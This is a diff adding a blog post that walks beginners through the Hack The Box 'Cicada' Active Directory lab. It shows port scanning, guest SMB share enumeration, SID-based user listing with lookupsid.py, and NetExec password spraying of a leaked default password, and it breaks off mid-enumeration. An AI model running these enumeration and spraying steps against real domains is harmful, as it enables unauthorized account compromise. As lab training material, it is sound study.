@@ -1,0 +1,400 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Test - Blogs by JamesLorence</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+Hello everyone! I am James Lorence an Offensive Security Consultant and for this blog I will discuss with you some introductory Active Directory Penetration Testing for beginners.
+DISCLAIMER: I am not an expert in Active Directory penetration testing. This blog documents my learning journey and the techniques I’m practicing. The goal is to share what I’ve learned so far and grow alongside others who are also exploring Active Directory security testing."><meta property="og:image" content="https://example.org/"><meta property="og:url" content="https://example.org/posts/test/"><meta property="og:site_name" content="Blogs by JamesLorence"><meta property="og:title" content="Test"><meta property="og:description" content="Hello everyone! I am James Lorence an Offensive Security Consultant and for this blog I will discuss with you some introductory Active Directory Penetration Testing for beginners.
+DISCLAIMER: I am not an expert in Active Directory penetration testing. This blog documents my learning journey and the techniques I’m practicing. The goal is to share what I’ve learned so far and grow alongside others who are also exploring Active Directory security testing."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-02-23T16:08:40+08:00"><meta property="article:modified_time" content="2026-02-23T16:08:40+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Test"><meta name=twitter:description content="Hello everyone! I am James Lorence an Offensive Security Consultant and for this blog I will discuss with you some introductory Active Directory Penetration Testing for beginners.
+DISCLAIMER: I am not an expert in Active Directory penetration testing. This blog documents my learning journey and the techniques I’m practicing. The goal is to share what I’ve learned so far and grow alongside others who are also exploring Active Directory security testing."><link href=https://example.org/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://example.org/css/main.0e7cfa64e3165b600a186e0a5194c36ba0a6363ac7865691ed974005f1661f74.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://example.org/css/dark.6b7c9ec6b75e33b10ee8446647ec1447521df8243f1dd4027f4f40a79df2f4f2.css media="(prefers-color-scheme: dark)"></head><body><div class=content><header><div class=main><a href=https://example.org/>Blogs by JamesLorence</a></div><nav><a href=/>Home</a>
+<a href=/posts>All posts</a>
+<a href=/about>About</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=post-container><div class=post-content><div class=title><h1 class=title>Test</h1><div class=meta>Posted on Feb 23, 2026</div></div><section class=body><p><img src=https://cdn-images-1.medium.com/max/1200/0*ZBevrJS7ukirKPg3.jpg alt></p><p>Hello everyone! I am James Lorence an Offensive Security Consultant and for this blog I will discuss with you some introductory Active Directory Penetration Testing for beginners.</p><p><strong>DISCLAIMER:</strong> I am <strong>not</strong> an expert in Active Directory penetration testing. This blog documents my learning journey and the techniques I’m practicing. The goal is to share what I’ve learned so far and grow alongside others who are also exploring Active Directory security testing.</p><p>This blog is for <strong>educational purposes only</strong>.</p><p>Do NOT attempt to test or exploit systems unless you have <strong>explicit written authorization</strong>.</p><p>Unauthorized access to computer systems is illegal and can lead to serious legal consequences.</p><p>Only practice in:</p><ul><li>Lab environments</li><li>Personal test environments</li><li>Platforms like Hack The Box or similar training labs</li><li>Or during authorized penetration testing engagements</li></ul><p>Always stay ethical. Always stay legal.</p><hr><p><strong>NOTE:</strong> If you have no idea about Active Directory, this short YouTube video can help you get a grasp of idea on what is Active Directory :D</p><p><a href="https://youtu.be/OfXJlmuoc20?si=1SXtygt9EjdrrHgw">https://youtu.be/OfXJlmuoc20?si=1SXtygt9EjdrrHgw</a></p><p>Active Directory penetration testing is a very interesting niche since the domain is very deep, what I mean very deep for me is that depending on the lab, Domain, or organization of the client, Active Directory Penetration testing can go a long way..</p><h4 id=why-can-it-go-a-long-waythough>Why can it go a long way though?</h4><ol><li>Active Directory environments can be complex and expansive. Depending on the organization or lab setup, an AD environment may contain multiple domains within a forest, thousands of users, computers, groups, and various trust relationships.</li><li>There are also numerous tools available for Active Directory enumeration and exploitation, such as <strong>PowerView</strong> and <strong>BloodHound</strong>, among many others. Each tool helps uncover different aspects of the domain environment, from user privileges to attack paths.</li><li>Most importantly, thorough <strong>ENUMERATION</strong> is REALLY important when testing Active Directory. AD attacks are highly dependent on context — permissions, group memberships, delegated rights, and misconfigurations. Because of this, enumeration can be time-consuming and sometimes exhausting, but it is often the key to identifying a viable attack path.</li></ol><p>For this blog, I will demonstrate some simple Active Directory attack that can help us get a grasp of how amazing a simple mistake could lead to a Domain Compromise. We will use HackTheBox’s Lab Environment for this demonstration.</p><p>This blog will be quite long so stick around and grab your snacks hahaha!</p><hr><h3 id=part-1-initial-enumeration>PART 1: Initial Enumeration</h3><p>The first step to Penetration Testing is of course, always do the reconnaissance and scanning so we get to know what ports are available and what machine we are scanning.</p><p>For initial port enumeration, I used <strong>RustScan</strong>. RustScan is a high-speed port scanner written in Rust that quickly identifies open ports and then passes them to Nmap for detailed service and version detection.</p><p>I chose <strong>RustScan</strong> because of its speed and efficiency during large port scans, and also to gain more hands-on experience using the tool in general</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ rustscan -a 10.129.231.149 --ulimit 2000 -r 1-65535 -- -A sCV
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[~] The config file is expected to be at &#34;/home/pwnedbyjls/.rustscan.toml&#34;  
+</span></span><span style=display:flex><span>[~] Automatically increasing ulimit value to 2000.  
+</span></span><span style=display:flex><span>Open 10.129.231.149:53  
+</span></span><span style=display:flex><span>Open 10.129.231.149:88  
+</span></span><span style=display:flex><span>Open 10.129.231.149:135  
+</span></span><span style=display:flex><span>Open 10.129.231.149:139  
+</span></span><span style=display:flex><span>Open 10.129.231.149:389  
+</span></span><span style=display:flex><span>Open 10.129.231.149:445  
+</span></span><span style=display:flex><span>Open 10.129.231.149:464  
+</span></span><span style=display:flex><span>Open 10.129.231.149:593  
+</span></span><span style=display:flex><span>Open 10.129.231.149:636  
+</span></span><span style=display:flex><span>Open 10.129.231.149:3268  
+</span></span><span style=display:flex><span>Open 10.129.231.149:3269  
+</span></span><span style=display:flex><span>Open 10.129.231.149:5985  
+</span></span><span style=display:flex><span>Open 10.129.231.149:65031  
+</span></span><span style=display:flex><span>[~] Starting Script(s)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;SNIP&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE       REASON          VERSION  
+</span></span><span style=display:flex><span>53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus  
+</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-17 21:54:06Z)  
+</span></span><span style=display:flex><span>135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
+</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  
+</span></span><span style=display:flex><span>389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada  
+</span></span><span style=display:flex><span>| Public Key type: rsa  
+</span></span><span style=display:flex><span>| Public Key bits: 2048  
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption  
+</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16  
+</span></span><span style=display:flex><span>| Not valid after:  2025-08-22T20:24:16  
+</span></span><span style=display:flex><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65  
+</span></span><span style=display:flex><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a  
+</span></span><span style=display:flex><span>| -----BEGIN CERTIFICATE-----  
+</span></span><span style=display:flex><span>&lt;SNIP&gt;  
+</span></span><span style=display:flex><span>|_-----END CERTIFICATE-----  
+</span></span><span style=display:flex><span>|_ssl-date: 2026-02-17T21:55:51+00:00; +7h00m00s from scanner time.  
+</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds? syn-ack ttl 127  
+</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?     syn-ack ttl 127  
+</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
+</span></span><span style=display:flex><span>636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada  
+</span></span><span style=display:flex><span>| Public Key type: rsa  
+</span></span><span style=display:flex><span>| Public Key bits: 2048  
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption  
+</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16  
+</span></span><span style=display:flex><span>| Not valid after:  2025-08-22T20:24:16  
+</span></span><span style=display:flex><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65  
+</span></span><span style=display:flex><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a  
+</span></span><span style=display:flex><span>| -----BEGIN CERTIFICATE-----  
+</span></span><span style=display:flex><span>&lt;SNIP&gt;  
+</span></span><span style=display:flex><span>|_-----END CERTIFICATE-----  
+</span></span><span style=display:flex><span>|_ssl-date: 2026-02-17T21:55:51+00:00; +7h00m00s from scanner time.  
+</span></span><span style=display:flex><span>3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada  
+</span></span><span style=display:flex><span>| Public Key type: rsa  
+</span></span><span style=display:flex><span>| Public Key bits: 2048  
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption  
+</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16  
+</span></span><span style=display:flex><span>| Not valid after:  2025-08-22T20:24:16  
+</span></span><span style=display:flex><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65  
+</span></span><span style=display:flex><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a  
+</span></span><span style=display:flex><span>| -----BEGIN CERTIFICATE-----  
+</span></span><span style=display:flex><span>&lt;SNIP&gt;  
+</span></span><span style=display:flex><span>|_-----END CERTIFICATE-----  
+</span></span><span style=display:flex><span>|_ssl-date: 2026-02-17T21:55:51+00:00; +7h00m00s from scanner time.  
+</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb  
+</span></span><span style=display:flex><span>| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada  
+</span></span><span style=display:flex><span>| Public Key type: rsa  
+</span></span><span style=display:flex><span>| Public Key bits: 2048  
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption  
+</span></span><span style=display:flex><span>| Not valid before: 2024-08-22T20:24:16  
+</span></span><span style=display:flex><span>| Not valid after:  2025-08-22T20:24:16  
+</span></span><span style=display:flex><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65  
+</span></span><span style=display:flex><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a  
+</span></span><span style=display:flex><span>| -----BEGIN CERTIFICATE-----  
+</span></span><span style=display:flex><span>&lt;SNIP&gt;  
+</span></span><span style=display:flex><span>|_-----END CERTIFICATE-----  
+</span></span><span style=display:flex><span>|_ssl-date: 2026-02-17T21:55:51+00:00; +7h00m00s from scanner time.  
+</span></span><span style=display:flex><span>5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0  
+</span></span><span style=display:flex><span>|_http-title: Not Found  
+</span></span><span style=display:flex><span>65031/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
+</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
+</span></span><span style=display:flex><span>Device type: general purpose  
+</span></span><span style=display:flex><span>Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)  
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
+</span></span><span style=display:flex><span>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete  
+</span></span><span style=display:flex><span>Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
+</span></span><span style=display:flex><span>No exact OS matches for host (test conditions non-ideal).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;SNIP&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>NSE: Script Post-scanning.  
+</span></span><span style=display:flex><span>NSE: Starting runlevel 1 (of 3) scan.  
+</span></span><span style=display:flex><span>Initiating NSE at 22:55  
+</span></span><span style=display:flex><span>Completed NSE at 22:55, 0.00s elapsed  
+</span></span><span style=display:flex><span>NSE: Starting runlevel 2 (of 3) scan.  
+</span></span><span style=display:flex><span>Initiating NSE at 22:55  
+</span></span><span style=display:flex><span>Completed NSE at 22:55, 0.00s elapsed  
+</span></span><span style=display:flex><span>NSE: Starting runlevel 3 (of 3) scan.  
+</span></span><span style=display:flex><span>Initiating NSE at 22:55  
+</span></span><span style=display:flex><span>Completed NSE at 22:55, 0.00s elapsed  
+</span></span><span style=display:flex><span>Read data files from: /usr/share/nmap  
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
+</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 128.91 seconds  
+</span></span><span style=display:flex><span>           Raw packets sent: 101 (8.128KB) | Rcvd: 43 (2.596KB)
+</span></span></code></pre></div><p>As you can see from the initial scan, there is a lot of details and ideas that we got based on the IP addressed we scanned. Analyzing the ports opened, we can recognize that this machine is running on Active Directory.</p><p><strong>Well how do you know it is an Active Directory?</strong></p><p>If you look at the ports opened, it is running on:<br><strong>Port 88:</strong> <em>Kerberos</em> is the primary authentication protocol used in Active Directory environments.</p><p><strong>Port 445:</strong> <em>Server Message Block (SMB)</em>, it is a protocol is a network communication protocol used for sharing files, printers, serial ports, and other resources between nodes on a network.</p><p><strong>Port 389:</strong> <em>Lightweight Directory Access Protocol (LDAP)</em> used to access and manage directory information over a network.</p><p>When these services are exposed together, particularly <strong>Kerberos</strong> and <strong>LDAP</strong>, it strongly suggests that the machine is functioning as a <strong>Domain Controller</strong>.</p><p>This gives us an important starting point for <strong>enumeration</strong>, as Domain Controllers contain valuable information about users, groups, and domain configurations.</p><h3 id=part-ii-initial-enumeration-of-thedomain>PART II: Initial Enumeration of the domain</h3><p>First thing we always want to check in an Active Directory domain is the <strong>Server Message Block (SMB)</strong>, since it might contain very juicy files if any are exposed.</p><p>So we are going to <strong>ENUMERATE</strong> again by checking if <strong>ANONYMOUS access</strong> is enabled when connecting to SMB. </p><p>If it can be accessed anonymously, this could be dangerous, as an attacker could further enumerate the shared files and potentially discover sensitive information such as configuration files, scripts, or even credentials.</p><p>We will use the tool <strong>NetExec</strong>, which is very, VERY handy when testing Active Directory. </p><p>This tool is commonly used for enumerating valid credentials, SMB shares, and other domain services, which makes it extremely useful during the enumeration phase.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#f92672>$</span> nxc smb cicada<span style=color:#f92672>.</span>htb  <span style=color:#f92672>-</span>u <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>--</span>shares                               
+</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>10.129</span><span style=color:#f92672>.</span><span style=color:#ae81ff>231.149</span>  <span style=color:#ae81ff>445</span>    CICADA<span style=color:#f92672>-</span>DC        [<span style=color:#f92672>*</span>] Windows Server <span style=color:#ae81ff>2022</span> Build <span style=color:#ae81ff>20348</span> x64 (name:CICADA<span style=color:#f92672>-</span>DC) (domain:cicada<span style=color:#f92672>.</span>htb) (signing:True) (SMBv1:None) (Null Auth:True)  
+</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>10.129</span><span style=color:#f92672>.</span><span style=color:#ae81ff>231.149</span>  <span style=color:#ae81ff>445</span>    CICADA<span style=color:#f92672>-</span>DC        [<span style=color:#f92672>+</span>] cicada<span style=color:#f92672>.</span>htb\:   
+</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>10.129</span><span style=color:#f92672>.</span><span style=color:#ae81ff>231.149</span>  <span style=color:#ae81ff>445</span>    CICADA<span style=color:#f92672>-</span>DC        [<span style=color:#f92672>-</span>] Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span></code></pre></div><p>Here is a tldr about the command used:</p><p><code>-u</code> is the username; we set it to <code>''</code> to check for anonymous access.<br><code>-p</code> is the password; we also set it to <code>''</code> since we are trying to connect anonymously.<br> <code>--shares</code> is used to enumerate the available SMB shares.</p><p>Since we received the error <code>[-] Error enumerating shares</code>, it means that anonymous access is not allowed.</p><p>BUT… what if there is another way?</p><p>We could also try checking for <strong>Guest credentials</strong>.</p><p>Sometimes, administrators enable guest access for legacy systems, ease of file sharing, misconfiguration, or testing purposes. In some environments, Guest access may be left enabled unintentionally, which could allow limited authentication without valid domain credentials.</p><p>If Guest authentication is permitted, it might still allow us to enumerate shares or gather useful information from the domain.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nxc smb cicada.htb  -u &#39;guest&#39; -p &#39;&#39; --shares  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest:   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        DEV                               
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        HR              READ              
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share
+</span></span></code></pre></div><p>BINGO! We were able to get the shares of the machine. There are some shares as guest that we can read specifically the “HR” Shares. It is interesting to read the file shares since as I’ve said earlier, there might be <strong>JUICY</strong> files lying around that share such as text, scripts, or even passwords!</p><p>We will going to use the <strong>Smbclient tool</strong> to enumerate what’s inside the HR Shares.</p><blockquote><p><strong>INFO:</strong> If you don’t know whats smbclient, it is a command-line tool <strong>SMB/CIFS</strong> network resources, such as shared folders and printers, on Windows or Samba servers.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ smbclient //cicada.htb/HR   
+</span></span><span style=display:flex><span>Password for [WORKGROUP\pwnedbyjls]:  
+</span></span><span style=display:flex><span>Try &#34;help&#34; to get a list of possible commands.  
+</span></span><span style=display:flex><span>smb: \&gt; dir  
+</span></span><span style=display:flex><span>  .                                   D        0  Thu Mar 14 20:29:09 2024  
+</span></span><span style=display:flex><span>  ..                                  D        0  Thu Mar 14 20:21:29 2024  
+</span></span><span style=display:flex><span>  Notice from HR.txt                  A     1266  Thu Aug 29 01:31:48 2024
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                4168447 blocks of size 4096. 477726 blocks available  
+</span></span><span style=display:flex><span>smb: \&gt; get &#34;Notice from HR.txt&#34;  
+</span></span><span style=display:flex><span>getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)
+</span></span></code></pre></div><p>From this command, we saw that there is a .TXT file hanging around from the SMB share, so what we’re going to do is download the .txt file to our own machine and read it of course!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ cat &#39;Notice from HR.txt&#39; 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Dear new hire!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Welcome to Cicada Corp! We&#39;re thrilled to have you join our team. As part of our security protocols, it&#39;s essential that you change your default password to something unique and secure.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Your default password is: &lt;REDACTED&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>To change your password:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.  
+</span></span><span style=display:flex><span>2. Once logged in, navigate to your account settings or profile settings section.  
+</span></span><span style=display:flex><span>3. Look for the option to change your password. This will be labeled as &#34;Change Password&#34;.  
+</span></span><span style=display:flex><span>4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.  
+</span></span><span style=display:flex><span>5. After changing your password, make sure to save your changes.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>If you encounter any issues or need assistance with changing your password, don&#39;t hesitate to reach out to our support team at support@cicada.htb.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Best regards,  
+</span></span><span style=display:flex><span>Cicada Corp
+</span></span></code></pre></div><p>As you can see from the text file, there is a PLAINTEXT default password credentials! This default password might be for the new hires…</p><p>This is dangerous as the attacker might leverage this plaintext password to password spray into domain users later on.</p><blockquote><p>If you don’t know what <strong>password spraying</strong> is, it is a type of brute-force attack where attackers use a few common passwords across multiple accounts</p></blockquote><p>We will now use the tool <strong>LookupSID.py</strong> to enumerate for the users inside the active directory (I know as I said earlier, there are many tools that can be leveraged when testing Active Directory).</p><p><strong>LookupSID.py</strong> is used to enumerate Security Identifiers (SIDs) and their corresponding usernames on a target system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ lookupsid.py &#39;cicada.htb/guest&#39;@cicada.htb -no-pass  
+</span></span><span style=display:flex><span>Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[*] Brute forcing SIDs at cicada.htb  
+</span></span><span style=display:flex><span>[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]  
+</span></span><span style=display:flex><span>[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727  
+</span></span><span style=display:flex><span>&lt;SNIP&gt;  
+</span></span><span style=display:flex><span>1104: CICADA\john.smoulder (SidTypeUser)  
+</span></span><span style=display:flex><span>1105: CICADA\sarah.dantelia (SidTypeUser)  
+</span></span><span style=display:flex><span>1106: CICADA\michael.wrightson (SidTypeUser)  
+</span></span><span style=display:flex><span>1108: CICADA\david.orelious (SidTypeUser)  
+</span></span><span style=display:flex><span>1109: CICADA\Dev Support (SidTypeGroup)  
+</span></span><span style=display:flex><span>1601: CICADA\emily.oscars (SidTypeUser)
+</span></span></code></pre></div><p>And… there you go! We’ve just enumerated several user accounts in the Active Directory domain.</p><p>We will now compile all the entries that fall under the <strong>SidTypeUser</strong> category so they can potentially be used for password spraying later.</p><p>We specifically compile the entries under the <strong>SidTypeUser</strong> category because these represent actual user accounts that can authenticate with a password</p><p><code>$ lookupsid.py 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt</code></p><p>This may look like a lot of scripting jargon just to compile the <strong>SidTypeUser</strong> entries, but I’ll try to explain what’s happening without going into too much detail.</p><p>Basically, what this command does is:</p><ol><li>Enumerates domain SIDs</li><li>Filters only user accounts</li><li>Extracts just the usernames</li><li>Saves them into a file</li></ol><p>So instead of manually copying and pasting usernames, we automate the process, making our enumeration faster and more efficient.</p><p>We will try to password spray the password we obtained from the HR <code>.txt</code> file and use the compiled list of users to find a valid credential login using the <strong>NetExec</strong> tool again. (Maybe this could be a newhire or just a naughty user who doesn’t change his/her password)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nxc smb cicada.htb -u users.txt -p &#39;&lt;REDACTED&gt;&#39;  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:&lt;REDACTED&gt; STATUS_LOGON_FAILURE  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:&lt;REDACTED&gt; STATUS_LOGON_FAILURE   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:&lt;REDACTED&gt; STATUS_LOGON_FAILURE   
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:&lt;REDACTED&gt; STATUS_LOGON_FAILURE  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:&lt;REDACTED&gt; STATUS_LOGON_FAILURE  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:&lt;REDACTED&gt;STATUS_LOGON_FAILURE  
+</span></span><span style=display:flex><span>SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:&lt;REDACTED&gt;
+</span></span></code></pre></div><p>We got a valid credential by looking at the <code>[+]</code> in the Netexec output and looks like user <code>michael.wrightson</code> isn’t changing his password yet.. Might be a new hire with a default password?</p><p><strong>How to prevent this:</strong></p><p>Always change your default password immediately! Do not wait to get compromised till you change your password!</p><h4 id=now-what>Now what??</h4><p>Of course, we’re going to enumerate <code>michael.wrightson</code> account once again such as looking for READ/WRITE SMB share access.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nxc smb cicada.htb -u &#39;michael.wrightson&#39; -p &#39;&lt;REDACTED&gt;&#39; --shares  
